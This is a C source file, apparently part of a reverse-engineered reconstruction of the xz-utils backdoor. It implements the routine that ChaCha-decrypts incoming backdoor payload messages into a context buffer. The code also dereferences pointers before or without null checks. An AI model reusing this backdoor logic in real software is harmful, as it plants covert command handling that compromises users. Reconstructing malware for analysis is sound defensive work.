/**
 * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>
 **/
#include "xzre.h"

BOOL decrypt_payload_message(
	key_payload_t *payload,
	size_t payload_size,
	global_context_t *ctx
){
	backdoor_payload_hdr_t hdr = {0};
	u8 output[ED448_KEY_SIZE] = {0};

	memcpy(&hdr, payload, sizeof(hdr));

	if(!payload){
		if(!ctx) return FALSE;
		goto set_state_reset;
	}

	const size_t header_size = sizeof(payload->hdr) + sizeof(payload->body_length);
	static_assert(header_size == 18);

	do {
		if(!ctx) break;
		if(ctx->payload_state == 3) return TRUE;
		if(payload_size <= header_size || ctx->payload_state > 1) break;

		/** decrypt body_size and body */
		if(!chacha_decrypt(
			payload->data + sizeof(payload->hdr),
			payload_size - sizeof(payload->hdr),
			output,
			payload->hdr.bytes,
			payload->data + sizeof(payload->hdr),
			ctx->imported_funcs)) break;

		u16 body_length = payload->body_length;
		// body cannot be bigger than remaining length
		if(body_length >= payload_size - header_size){
			break;
		}
		
		// body cannot be bigger than the current data size
		if(body_length >= ctx->payload_data_size - ctx->current_data_size){
			break;
		}

		/** keep a copy of the last payload body */
		u8 *data = &ctx->payload_data[ctx->current_data_size];
		__builtin_memcpy(data, payload->body, body_length);
		ctx->current_data_size += body_length;

		/** decrypt body */
		if(!chacha_decrypt(
			payload->data + sizeof(payload->hdr),
			payload_size - sizeof(payload->hdr),
			output,
			payload->hdr.bytes,
			payload->data + sizeof(payload->hdr),
			ctx->imported_funcs
		)) break;

		return TRUE;
	} while(0);

	set_state_reset:
	ctx->payload_state = PAYLOAD_STATE_INITIAL;

	return FALSE;
}
